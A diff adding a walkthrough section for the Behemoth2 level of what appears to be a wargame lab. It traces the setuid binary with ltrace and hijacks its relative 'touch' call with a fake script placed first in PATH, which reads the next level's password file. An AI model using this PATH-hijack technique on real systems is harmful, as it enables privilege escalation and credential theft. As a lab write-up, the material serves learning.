@@ -353,6 +353,48 @@ cat /etc/behemoth_pass/behemoth2
 Okay, so we have the password. Usually, we don't need to do this so manually, there are scripts that align gdb's address. Moreover, we can try to jump in the middle of our NOP's slide in our environmental varible. 
 
 ## Behemoth2
+running behemoth2 with radare2 or gdb or objdump, can give us some clues. The program tries to create a file with the name of the pid of the parent process. After that, it sleeps for a very long time and then tries to read a file. We obviously want to exploit the program before the sleep, because the time to sleep is a constant value and we cannot change it without patching the program.
+Okay, let's see how the program works:
+```
+behemoth2@behemoth:/behemoth$ ltrace ./behemoth2
+__libc_start_main(0x804856b, 1, 0xffffd774, 0x8048660 <unfinished ...>
+getpid()                                                                                                                   = 19652
+sprintf("touch 19652", "touch %d", 19652)                                                                                  = 11
+__lxstat(3, "19652", 0xffffd640)                                                                                           = -1
+unlink("19652")                                                                                                            = -1
+geteuid()                                                                                                                  = 13002
+geteuid()                                                                                                                  = 13002
+setreuid(13002, 13002)                                                                                                     = 0
+system("touch 19652"touch: cannot touch '19652': Permission denied
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                     = 256
+sleep(2000^C <no return ...>
+--- SIGINT (Interrupt) ---
++++ killed by SIGINT +++
+
+```
+We can see the the process id is 19652, and that file will be created with the touch command. lstat return -1 because there is no such a file (NOTICE: it's a relative path, not absolute... hmm). Unlink fails as well (return value is -1). 
+Now, the vulnerability in the following file is the relative path of touch. Because we use an relative value and there is no path to touch in the $PATH environmental variable, we can abuse the program. Usually, if absolute path is not mentioned, the program will try to find it in $PATH, but here we don't have it as well:
+```
+behemoth2@behemoth:/behemoth$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+```
+
+So we want to insert a new path to **our** controlled touch version of touch, that will spawn a shell for us. That way, when behemoth will look in $PATH the path to touch, it will jump into our code -> will print the password:
+```
+behemoth2@behemoth:/tmp/ii$ mkdir temp/ii
+behemoth2@behemoth:/tmp/ii$ echo "cat /etc/behemoth_pass/behemoth3" > /tmp/ii/touch
+behemoth2@behemoth:/tmp/ii$ chmod 777 touch (let everyone permission to run this file, who cares?)
+behemoth2@behemoth:/tmp/ii$ cd /behemoth
+behemoth2@behemoth:/tmp/ii$ export PATH=/tmp/ii:$PATH (now we add our path)
+behemoth2@behemoth:/behemoth$ echo $PATH
+/tmp/ii:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+behemoth2@behemoth:/behemoth$ ./behemoth2
+*******
+quit
+^C
+```
 
 
 
